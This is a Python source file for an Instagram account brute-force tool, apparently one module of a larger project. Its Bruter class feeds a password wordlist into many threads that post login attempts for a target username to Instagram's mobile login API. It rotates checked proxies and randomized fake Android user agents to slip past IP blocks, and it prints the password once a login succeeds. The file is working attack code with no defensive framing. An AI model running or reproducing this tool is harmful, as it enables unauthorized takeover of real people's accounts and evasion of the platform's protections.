from time import time
from .proxychecker import ProxyChecker
from .console import (Console,runnerBruteBanner)
from colorama import init,Fore
from threading import (Thread,Lock)
from queue import Queue
from random import (choice,randint)

import requests
import json
import uuid
import os

init(autoreset=True) # colorama
class Bruter:
    def __init__(self,wordlist:str,proxy_type:str,victim:str,max_thread:int) -> None:
        self.__max_thread = max_thread
        self.__wordlist = wordlist
        self.__proxy_type = proxy_type
        self.__victim = victim
        self.__getproxy = []
        self.__passw = "" # ekrana parolayı yazdırmak için tanımlanan değişken
        self.__isAlive = True 
        self.__prxs = ["http","socks4","socks5"]
        os.system("cls")

        if self.__proxy_type in self.__prxs:
            print(f"{Fore.YELLOW}[{self.__proxy_type}]  ─────  Proxy Checked is Starting")
            self.__getproxy = ProxyChecker(self.__proxy_type).getWorkerProxy
    
        elif not self.__proxy_type in self.__prxs:
            self.__getproxy = ProxyChecker(isProxyPath=True,filePath=self.__proxy_type).getWorkerProxy

        if self.__getproxy == []:
            print("No Working Proxy Found!")

        else:
            os.system("cls")
            print(Console.BANNER_BRUTE+"\n")
            self.__attackStart()

    def __login(self,q:Queue):
        if not q.empty():
            try:
                with requests.Session() as session:
                    password = q.get()
                    dispose = "" # Parola deneme sırasında çalışan proxye denk gelirsem buna kaydedicem işlem yapıp ardından yok edicem
                    choice_proxy = choice(self.__getproxy)
                    __header = {
                        'Host':'i.instagram.com','Accept':'*/*',  'User-Agent': self.__useragents(),
                        'Cookie':'missing','Accept-Encoding':'gzip, deflate',
                        'Accept-Language':'en-US','X-IG-Capabilities':'3brTvw==',
                        'X-IG-Connection-Type':'WIFI','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                        }
                    __data = {
                            "uuid": uuid.uuid4().hex,"password": password,
                            "username": self.__victim,'device_id':uuid.uuid4().hex,
                            'from_reg':'false','_csrftoken':"missing",
                            'login_attempt_countn':'0'
                        }
                    if not self.__proxy_type in self.__prxs:
                        __proxies = {
                            "http":f"http://{choice_proxy}",
                            "https":f"http://{choice_proxy}"
                        }
                    else:
                        __proxies = {
                            "http":f"{self.__proxy_type}://{choice_proxy}",
                            "https":f"{self.__proxy_type}://{choice_proxy}"
                        }
                    s = session.post("https://i.instagram.com/api/v1/accounts/login/",data=__data,headers=__header,proxies=__proxies,timeout=randint(5,50))

                    json_load = json.loads(s.text)
                    print(json_load)
                    for k,v in json_load.items():
                        if k == "logged_in_user":
                            self.__isAlive = False
                            self.__passw = password
                            q.queue.clear()
                            q.task_done()

                        elif k == "error_type":
                            if v == "ip_block":
                                del dispose

                            elif v == "bad_password":
                                dispose = choice_proxy
                                __proxies.update({"http":f"{self.__proxy_type}://{dispose}","https":f"{self.__proxy_type}://{dispose}"})

                        elif k == "message":
                            if v == "challenge_required":
                                self.__isAlive = False
                                self.__passw = password
                                q.queue.clear()
                                q.task_done()

                    os.system("cls")
                    print(runnerBruteBanner(passw=password,ip=choice_proxy,
                                            words=len(list(self.__readerwordlist())),
                                            prxies=len(self.__getproxy),target=self.__victim))

            except (requests.exceptions.ConnectTimeout,
                    requests.exceptions.ConnectionError,
                    requests.exceptions.ProxyError,
                    requests.exceptions.ReadTimeout,KeyError):
                pass

    def __readerwordlist(self):
        try:
            with open(file=self.__wordlist,mode="r",encoding="utf-8") as f:
                for i in f:
                    yield i.replace("\n","")
        except FileNotFoundError:
            print("File Not Found!")
    
    def __useragents(self):
        dpi_phone = ['133','320','515','160','640','240','120''800','480','225','768','216','1024']
        model_phone = ['Nokia 2.4','HUAWEI','Galaxy','Unlocked Smartphones','Nexus 6P','Mobile Phones','Xiaomi','samsung','OnePlus']
        pxl_phone = ['623x1280','700x1245','800x1280','1080x2340','1320x2400','1242x2688']
        i_version = ['114.0.0.20.2','114.0.0.38.120','114.0.0.20.70','114.0.0.28.120','114.0.0.0.24','114.0.0.0.41']
        user_agent = f'Instagram {choice(i_version)} Android (30/3.0; {choice(dpi_phone)}dpi; {choice(pxl_phone)}; huawei/google; {choice(model_phone)}; angler; angler; en_US)'
        return user_agent
    
    def __attackStart(self):
        __queue = Queue()
        __threads = []
        # __queuelock = Lock()
        first = time()
        try:                
            while self.__isAlive:
                for passw in self.__readerwordlist():
                    __queue.put(passw)
                
                for _ in range(self.__max_thread):
                    t1 = Thread(target=self.__login,daemon=True,args=(__queue,))
                    t1.start()
                    __threads.append(t1)
                
                if not self.__isAlive:
                    break
            
            last = time()
            now_time = (last-first).__round__(3)
            if self.__isAlive:
                print(f"{Fore.MAGENTA}[ {Fore.RED}!{Fore.MAGENTA} ] Password not found.{Fore.RESET}")
            
            else:
                print(f"{Fore.MAGENTA}[ {Fore.RED}+{Fore.MAGENTA} ] Password is Found : {Fore.CYAN}{self.__passw}{Fore.RESET}")

            print(f"{Fore.MAGENTA}[ {Fore.RED}-{Fore.MAGENTA} ] Brute Force Attack is completed\n[ {Fore.CYAN}?{Fore.MAGENTA} ]\n  ╰────> Attack Lasted {str(now_time)+' Seconds.' if now_time < 60 else str((now_time/60).__round__(3))+' Minutes.'}{Fore.RESET}")
        
        except Exception as e:
            print(e)
